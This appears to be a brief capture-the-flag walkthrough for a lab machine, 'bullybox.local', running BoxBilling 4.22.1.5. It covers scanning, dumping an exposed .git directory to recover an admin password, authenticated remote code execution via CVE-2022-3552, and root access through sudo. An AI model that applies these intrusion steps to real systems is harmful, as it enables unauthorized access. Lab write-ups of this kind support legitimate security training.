

## System Info
- **Hostname:** bullybox.local  
- **OS/Tech:** Ubuntu, PHP, BoxBilling 4.22.1.5  

---

## Credentials
- **Admin Panel:**  
  - **Username:** admin  
  - **Password:** Playing-Unstylish7-Provided

---

## Service Enumeration

**Nmap scan results:**
```bash
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http  Apache httpd 2.4.52 (Ubuntu)
```

- **HTTP (80):** BoxBilling panel  
- **SSH (22):** OpenSSH (no initial access)

---

## Initial Exploitation

1. **Leak discovery**  
   - Fuzzing found a public `/.git` directory.  
   - Dump it with `git-dumper`:
     ```bash
     git clone https://github.com/arthaud/git-dumper.git
     python3 git-dumper.py http://bullybox.local/.git/ ./repo
     ```
   - Extract `config.php` in `repo` to find DB credentials:
     ```php
     'user'     => 'admin',
     'password' => 'Playing-Unstylish7-Provided',
     ```

2. **Admin login**  
   - Visit `http://bullybox.local/admin` or the BoxBilling panel.  
   - Log in as `admin` with `Playing-Unstylish7-Provided`.

3. **RCE via CVE-2022-3552**  
   - BoxBilling 4.22.1.5 has an authenticated RCE (CVE-2022-3552).  
   - Use the PoC from the dumped repo under `repo/exploits/CVE-2022-3552.php`.  
   - Upload/execute it via the admin interface to spawn a shell.

4. **Shell user**: `yuki`  
   ```bash
   whoami   # yuki
   groups   # yuki, sudo
   ```

---

##  Privilege Escalation

As `yuki` (in the `sudo` group):
```bash
sudo -i
```
root login shell.

